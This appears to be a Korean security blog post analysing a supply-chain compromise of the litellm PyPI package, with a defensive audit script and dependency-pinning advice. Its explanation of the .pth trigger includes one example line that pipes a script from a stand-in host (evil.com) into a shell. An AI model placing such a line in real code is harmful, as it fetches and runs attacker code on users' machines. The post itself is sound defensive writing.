---
title: "PyPI 공급망 공격 대응기: litellm 해킹 사고에서 배운 것"
date: 2026-03-27
categories: [Security]
tags: [supply-chain-attack, pypi, python, security-audit, dependency-management]
excerpt: "litellm PyPI 패키지가 해킹당해 악성 코드가 삽입된 사고를 분석하고, AI 에이전트 시스템에서 공급망 공격을 방어하는 실전 대응법을 정리합니다."
toc: true
---

## 무슨 일이 있었나

2026년 3월, 인기 LLM 프록시 라이브러리 **litellm**의 PyPI 메인테이너 계정이 탈취되었다. 공격자는 공식 GitHub 릴리즈에 없는 `v1.82.7`, `v1.82.8` 버전을 PyPI에 직접 업로드했다.

악성 코드가 수행하는 동작:
- SSH 키, 환경변수(API 키, 시크릿) 전량 수집
- AWS/GCP/Azure/K8s 크레덴셜 탈취  
- 암호화폐 지갑, DB 비밀번호, SSL 키 수집
- AES-256 + RSA-4096으로 암호화 후 외부 서버로 전송

특히 `v1.82.8`은 **import 없이 Python 실행만으로 트리거**되는 `.pth` 파일 기법을 사용했다.

## 왜 위험한가

AI 에이전트 시스템은 일반 웹 서비스보다 공급망 공격에 더 취약하다:

```
일반 서버: 웹 프레임워크 + DB 드라이버 + 유틸
AI 에이전트: LLM SDK + 벡터DB + 임베딩 + 오케스트레이션 + 도구 연동
            → 의존성 체인이 2~3배 길다
```

의존성이 많을수록 공격 표면(attack surface)이 넓어진다. 한 패키지만 뚫려도 전체 시크릿이 유출될 수 있다.

## 실전 대응: 5단계 점검 스크립트

사고 인지 후 우리 시스템 전체를 점검한 방법이다:

```bash
#!/bin/bash
# 1. 해당 패키지 설치 여부 확인
pip3 list 2>/dev/null | grep -i litellm

# 2. 악성 .pth 파일 존재 확인 (import 없이 실행되는 트리거)
find /usr -name "litellm_init.pth" 2>/dev/null
find $(python3 -c "import site; print(site.getsitepackages()[0])") \
  -name "*.pth" -newer /tmp/checkpoint 2>/dev/null

# 3. site-packages 직접 확인
ls $(python3 -c "import site; print(site.getsitepackages()[0])") \
  | grep litellm

# 4. 실행 중 프로세스에서 참조 확인
ps aux | grep -i litellm | grep -v grep

# 5. 프로젝트 코드베이스 내 참조 검색
grep -r "litellm" --include="*.py" --include="*.toml" \
  --include="*.txt" --include="*.json" /path/to/workspace/
```

## 의존성 안전 관리 원칙

이번 사고에서 도출한 방어 원칙 4가지:

### 1. 버전 핀 고정 (Pin Exact Versions)

```toml
# pyproject.toml — 범위 지정 대신 정확한 버전 고정
[project]
dependencies = [
    "openai==1.12.0",
    "anthropic==0.18.1",
]
```

### 2. 해시 검증 활성화

```bash
# requirements.txt에 해시 포함
pip install --require-hashes -r requirements.txt
```

```
# requirements.txt
openai==1.12.0 \
    --hash=sha256:abc123...
```

### 3. GitHub Releases와 PyPI 버전 교차 검증

```python
import requests

def verify_version(package: str, version: str) -> bool:
    """PyPI 버전이 GitHub 릴리즈에도 존재하는지 확인"""
    gh = f"https://api.github.com/repos/BerriAI/{package}/releases"
    releases = requests.get(gh).json()
    gh_versions = {r["tag_name"].lstrip("v") for r in releases}
    return version in gh_versions
```

### 4. CI에서 의존성 감사 자동화

```yaml
# .github/workflows/audit.yml
- name: Audit dependencies
  run: |
    pip-audit --strict
    safety check --full-report
```

## .pth 파일 공격이란

Python은 `site-packages` 디렉토리의 `.pth` 파일을 **인터프리터 시작 시 자동 실행**한다. `import`로 불러올 필요가 없다:

```python
# malicious.pth 내용 예시
import os; os.system("curl https://evil.com/steal.sh | sh")
```

이 때문에 `v1.82.8`은 설치만 해도 다음 Python 실행에서 바로 작동했다. 대응법:

```bash
# .pth 파일 정기 모니터링
find $(python3 -c "import site; print(site.getsitepackages()[0])") \
  -name "*.pth" -exec cat {} \;
```

## 결론

공급망 공격은 "우리가 안 쓰면 안전"이 아니다. 의존성의 의존성(transitive dependency)까지 감사해야 한다. AI 에이전트 시스템처럼 의존성 체인이 긴 환경에서는 **버전 고정 + 해시 검증 + 정기 감사**가 기본이다.

이번 litellm 사고는 Google Mandiant가 조사 중이며, PyPI 측은 해당 패키지를 정지 처리했다. Docker 이미지 사용자는 의존성이 빌드 타임에 고정되어 있어 영향 없었다.

---

*이 글은 실제 보안 사고 대응 경험을 바탕으로 작성되었습니다.*
